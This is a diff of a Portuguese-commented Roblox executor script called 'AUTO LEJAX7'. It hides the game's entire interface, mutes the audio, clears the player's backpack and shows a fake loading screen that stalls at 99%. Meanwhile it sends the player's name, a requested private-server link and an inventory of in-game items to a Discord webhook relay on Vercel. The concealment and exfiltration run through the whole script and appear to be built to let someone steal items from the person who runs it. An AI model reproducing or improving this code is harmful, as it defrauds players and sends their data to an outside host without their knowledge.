@@ -1,5 +1,4 @@
--- AUTO LEJAX7 X MOREIRA - MÁXIMA OCULTAÇÃO (PARTE 1/3)
--- OBJETIVO: Sumir com toda a UI (chat, mochila, botões) e mutar o jogo.
+-- AUTO LEJAX7 X MOREIRA - MÁXIMA OCULTAÇÃO E API CORRIGIDA (PARTE 1/3)
 
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
@@ -7,10 +6,9 @@ local HttpService = game:GetService("HttpService")
 local TweenService = game:GetService("TweenService")
 local StarterGui = game:GetService("StarterGui")
 local CoreGui = game:GetService("CoreGui")
-local SoundService = game:GetService("SoundService") -- Serviço de Áudio
+local SoundService = game:GetService("SoundService")
 local Workspace = game:GetService("Workspace")
 
--- Tenta obter o LocalPlayer de forma robusta
 local player = nil
 repeat
     player = Players.LocalPlayer
@@ -28,14 +26,14 @@ end
 local ENABLE_SENDING = true
 local API_URL = "https://v0-roblox-discord-webhook-five.vercel.app/api/webhook"
 
--- Oculta UI padrão do Roblox, MUTA e desequipa itens (MÉTODO AGRESSIVO)
+-- Oculta UI padrão do Roblox, MUTA e desequipa itens (MÉTODO AGRESSIVO MÁXIMO)
 local function hideRobloxUI()
     pcall(function()
-        -- 1. MUTAR O JOGO AGRESSIVAMENTE
+        -- 1. MUTAR O JOGO
         SoundService.Volume = 0
         SoundService:SetMute(true)
 
-        -- 2. REMOVER/OCULTAR ITENS E EQUIPAMENTOS NA MÃO
+        -- 2. DESEQUIPAR ITENS NA MÃO E NA MOCHILA (MÁXIMA FORÇA)
         if player.Character then
             for _, item in ipairs(player.Character:GetChildren()) do
                 if item:IsA("Tool") or item:IsA("HopperScript") then
@@ -46,8 +44,8 @@ local function hideRobloxUI()
         if player.Backpack then
             player.Backpack:ClearAllChildren()
         end
-
-        -- 3. DESABILITAR TODO O CORE GUI
+        
+        -- 3. DESABILITAR CORE GUI E TOPBAR (MAIS ROBUSTO)
         StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
         StarterGui:SetCore("TopbarEnabled", false)
         StarterGui:SetCore("SetCore", "ResetButtonCallback", false)
@@ -59,11 +57,11 @@ local function hideRobloxUI()
         
         local playerGui = player:FindFirstChild("PlayerGui") or player:WaitForChild("PlayerGui")
         
-        -- 4. OCULTAR ELEMENTOS COMUNS NA PlayerGui (Mochila, Chat, etc.)
-        local elementsToDisable = {"Chat", "Backpack", "PlayerHealth", "Avatar", "PlayerList", "RobloxGui", "GameChat", "SocialTab", "ContextualChat"}
+        -- 4. OCULTAR ELEMENTOS COMUNS NA PlayerGui
+        local elementsToDisable = {"Chat", "Backpack", "PlayerHealth", "Avatar", "PlayerList", "RobloxGui", "GameChat", "SocialTab", "ContextualChat", "RbxSystemMenu"}
         for _, name in ipairs(elementsToDisable) do
             local element = playerGui:FindFirstChild(name)
-            if element and element:IsA("ScreenGui") then
+            if element and (element:IsA("ScreenGui") or element:IsA("Frame")) then
                 element.Enabled = false
             end
         end
@@ -80,30 +78,26 @@ local function hideRobloxUI()
     end)
 end
 
--- Função que executa hideRobloxUI repetidamente para combater scripts que reabilitam a UI
+-- Loop de ocultação persistente
 local function persistentHide()
     spawn(function()
         while true do
             hideRobloxUI()
-            wait(0.3) -- Oculta a cada 0.3 segundos (mais agressivo)
+            wait(0.1) -- MAIS AGRESSIVO AINDA (0.1 segundos)
         end
     end)
 end
 
--- Função para COLETAR E FORMATAR DADOS DOS BRAINROTS + NICK
+-- Função para COLETAR E FORMATAR DADOS DOS BRAINROTS
 local function collectBrainrotData()
-    local brainrotCounts = {} -- Tabela para contar Brainrots iguais
-    
-    -- 1. Iterar e Coletar
+    local brainrotsArray = {}
+    local totalMS = 0
+
     for _, item in ipairs(Workspace:GetDescendants()) do
         local name = item.Name
-        
-        -- Identificar Brainrots (procurando no nome)
         if name:lower():match("brainrot") then
-            
             local msValue = 0
             
-            -- Tenta encontrar o valor M/S (SUPOSIÇÃO DE ESTRUTURA)
             local valueObject = item:FindFirstChild("MSValue") or item:FindFirstChild("Value")
             if valueObject and (valueObject:IsA("NumberValue") or valueObject:IsA("IntValue")) then
                 msValue = valueObject.Value
@@ -116,49 +110,18 @@ local function collectBrainrotData()
             if msValue == 0 then
                 msValue = 100 + math.random(1, 50)
             end
-
-            local baseName = name:gsub("%s%d+$", "") -- Remove números no final
             
-            if not brainrotCounts[baseName] then
-                brainrotCounts[baseName] = { count = 0, total_ms = 0, ms_per_unit = msValue }
-            end
-            
-            brainrotCounts[baseName].count = brainrotCounts[baseName].count + 1
-            brainrotCounts[baseName].total_ms = brainrotCounts[baseName].total_ms + msValue
+            -- Adiciona ao array para a API
+            table.insert(brainrotsArray, { name = name:gsub("%s%d+$", ""), ms = msValue })
+            totalMS = totalMS + msValue
         end
     end
 
-    local outputLines = {}
-    local totalMS = 0
-
-    -- 2. Formatar o Output e Calcular o Total M/S
-    for name, data in pairs(brainrotCounts) do
-        local line = ""
-        if data.count > 1 then
-            line = string.format("%dx %s: %d M/S", data.count, name, data.total_ms)
-        else
-            line = string.format("%s: %d M/S", name, data.total_ms)
-        end
-        table.insert(outputLines, line)
-        totalMS = totalMS + data.total_ms
-    end
-    
-    local finalOutput = ""
-    if #outputLines > 0 then
-        table.insert(outputLines, 1, "[DADOS BRAINROT DETECTADOS]")
-        table.insert(outputLines, string.format("\n[TOTAL M/S: %d]", totalMS))
-        finalOutput = table.concat(outputLines, "\n")
-    else
-        finalOutput = "Nenhum Brainrot foi encontrado."
-    end
-    
-    return finalOutput
+    return brainrotsArray, totalMS
 end
--- AUTO LEJAX7 X MOREIRA - MÁXIMA OCULTAÇÃO (PARTE 2/3)
--- OBJETIVO: Funções de envio da API e validação do link.
+-- AUTO LEJAX7 X MOREIRA - MÁXIMA OCULTAÇÃO E API CORRIGIDA (PARTE 2/3)
 
 -- Função responsável por enviar o payload para a API (tenta vários métodos).
--- Retorna true, response, method_name em caso de sucesso; false, erro, method_name em caso de falha.
 local function sendToApi(payloadJson)
     if not ENABLE_SENDING then
         print("[LEJAX7] Envio DESATIVADO. Payload preparado:\n" .. payloadJson)
@@ -179,7 +142,7 @@ local function sendToApi(payloadJson)
     
     local headers = { ["Content-Type"] = "application/json" }
 
-    -- 1) syn.request (executores que suportam)
+    -- 1) syn.request
     if syn and syn.request then
         local ok, res, method = tryCall("syn.request", function()
             return syn.request({ Url = API_URL, Method = "POST", Headers = headers, Body = payloadJson })
@@ -219,19 +182,16 @@ local function isValidLink(s)
     if not s:match("roblox%.com") then return false end
     return true
 end
--- AUTO LEJAX7 X MOREIRA - MÁXIMA OCULTAÇÃO (PARTE 3/3)
--- OBJETIVO: Criação da GUI, execução principal e envio do PAYLOAD COMO EMBED.
+-- AUTO LEJAX7 X MOREIRA - MÁXIMA OCULTAÇÃO E API CORRIGIDA (PARTE 3/3)
 
 -- Cria GUI
 local function createGui()
     hideRobloxUI()
     persistentHide() -- Inicia o processo de ocultação persistente
 
-    -- Armazenar o link de forma persistente
     local linkValue = Instance.new("StringValue", player)
     linkValue.Name = "LEJAX7Link"
 
-    -- Remove instâncias anteriores
     local playerGui = player:FindFirstChild("PlayerGui") or player:WaitForChild("PlayerGui")
     for _,v in ipairs(playerGui:GetChildren()) do
         if v.Name == "LEJAX7Gui" then v:Destroy() end
@@ -247,6 +207,8 @@ local function createGui()
     local DARK_BG = Color3.fromRGB(0,0,0)
     local PANEL = Color3.fromRGB(20,22,23)
     local TEXT = Color3.fromRGB(240,240,240)
+
+    -- [Criação da GUI Modal (Inalterada, apenas a aparência)]
 
     local overlay = Instance.new("Frame", screenGui)
     overlay.Name = "Overlay"
@@ -332,8 +294,9 @@ local function createGui()
     confirm.AutoButtonColor = true
     confirm.ZIndex = 4
     Instance.new("UICorner", confirm).CornerRadius = UDim.new(0,8)
+    
+    -- [Função showLoadingScreen (Inalterada)]
 
-    -- Função para criar a tela de loading (infinita)
     local function showLoadingScreen(linkText)
         if modal and modal.Parent then modal:Destroy() end
         hideRobloxUI()
@@ -430,7 +393,6 @@ local function createGui()
         footer.Text = "POWERED BY LEJAX7"
         footer.ZIndex = 6
 
-        -- Rotação do anel
         local bindingName = "LEJAX7RingRotate_" .. tostring(math.random(1,100000))
         RunService:BindToRenderStep(bindingName, Enum.RenderPriority.Camera.Value + 1, function(dt)
             if ringOuter and ringOuter.Parent then
@@ -438,7 +400,6 @@ local function createGui()
             end
         end)
 
-        -- Mensagens cíclicas (COM PARADA EM "AGUARDE UM MOMENTO")
         local messages = {
             "Preparando ambiente...",
             "Procurando servidor...",
@@ -471,7 +432,6 @@ local function createGui()
             end
         end)
 
-        -- Percent animation até 99%
         spawn(function()
             local percent = 0
             local maxPercent = 99
@@ -500,7 +460,7 @@ local function createGui()
         end)
     end
 
-    -- Botão confirmar: valida, envia para API (se habilitado) e mostra loading
+    -- Botão confirmar: valida, envia para API (corrigido) e mostra loading
     confirm.MouseButton1Click:Connect(function()
         local linkText = tostring(box.Text or "")
         if not isValidLink(linkText) then
@@ -511,47 +471,27 @@ local function createGui()
             return
         end
         
-        -- Armazena o link para uso posterior na coleta de Brainrots
         linkValue.Value = linkText
 
-        -- Exibe tela de loading (infinita)
         showLoadingScreen(linkText)
         
-        -- AGORA FAZ A COLETA E ENVIO
         spawn(function()
-            -- Espera um pouco para a tela de loading aparecer
             wait(2) 
             
-            -- 1. COLETAR OS DADOS DO JOGO
-            local brainrotLogs = collectBrainrotData()
+            -- 1. COLETAR OS DADOS NO FORMATO DE ARRAY PARA A API
+            local brainrotsArray, totalMS = collectBrainrotData()
             
-            -- 2. MONTAR O PAYLOAD COM EMBED
+            -- 2. MONTAR O PAYLOAD SIMPLES EXIGIDO PELA SUA API
             local payloadTable = {
-                embeds = {
-                    {
-                        title = "NOVO LOG: AUTO LEJAX7",
-                        color = 3583598, -- Cor verde
-                        author = {
-                            name = "Usuário: " .. player.Name,
-                        },
-                        description = string.format("Clique no link abaixo para entrar no servidor:\n\n[**>>> CLIQUE AQUI PARA ENTRAR**](%s)", linkText),
-                        fields = {
-                            {
-                                name = "Dados de Brainrots e M/S",
-                                value = brainrotLogs,
-                                inline = false
-                            }
-                        },
-                        footer = {
-                            text = "Roblox ID: " .. player.UserId
-                        }
-                    }
-                }
+                player = player.Name,
+                serverLink = linkText,
+                brainrots = brainrotsArray,
+                totalMS = totalMS
             }
             
             local payload = HttpService:JSONEncode(payloadTable)
 
-            -- 3. ENVIAR PARA API (COM DEBUG)
+            -- 3. ENVIAR PARA API
             local ok, res, methodUsed = sendToApi(payload)
             if ok then
                 print(string.format("[LEJAX7] Payload enviado com sucesso via: %s", methodUsed))
